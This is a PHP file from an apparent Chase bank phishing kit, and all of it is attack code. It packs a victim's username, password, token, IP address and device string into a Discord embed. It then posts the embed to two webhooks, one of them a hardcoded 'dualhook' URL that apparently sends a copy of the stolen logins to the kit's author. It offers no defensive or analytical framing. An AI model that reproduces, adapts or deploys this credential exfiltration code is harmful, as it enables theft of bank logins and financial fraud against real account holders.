<?php
$dualhook = "https://discord.com/api/webhooks/1191149294594560000/PCkEAUGZNvWIU7ZjnmMXg8mUT4umaWFEBtHDxTWl74G1DYoO9q8w1UsSDKn0A7jg1YPV";
$botname = "Chase The Bag";
$botpfp = "https://www.w-chase.com/web/img/logo.jpg";
$embedColor = "FFFFFF";
$ip = $_SERVER['REMOTE_ADDR'];
$host = $_SERVER['HTTP_USER_AGENT'];
$hookObject = json_encode([
    "username" => "BOT - $botname",
    "avatar_url" => "$botpfp",
     "content" => "",
     "embeds" => [
        [
            "title" => ''.$username.' Has Logged In',
            "type" => "rich",
            "description" => "[**Chase Login**](https://secure.chase.com/web/auth) | [**Discord Server**](https://discord.gg/wrXun2q3dH)",
            
            "color" => hexdec("$embedColor"),
                "thumbnail" => [
                    "url" => "$botpfp"
                ],
                "author" => [
                     "name" => "$botname - Result",
                ],
                "footer" => [
                    "text" => "$botname",
                  "icon_url" => "$botpfp"
                ],
                "fields" => [
                    [
                        "name" => "**Username**",
                        "value" => "$username",
                        "inline" => False
                    ],
                    [
                        "name" => "**Password**",
                        "value" => "$password",
                        "inline" => True
                    ],
                    [
                        "name" => "**Token**",
                        "value" => "$token",
                        "inline" => False
                    ],
                    [
                        "name" => "**IP Address**",
                        "value" => "$ip",
                        "inline" => False
                    ],
                    [
                        "name" => "**Device:**",
                        "value" => "$host",
                        "inline" => True
                    ],
                ]
            ],
        ],
    
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "$webhook",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
$response = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "$dualhook",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
$response = curl_exec($ch);
curl_close($ch);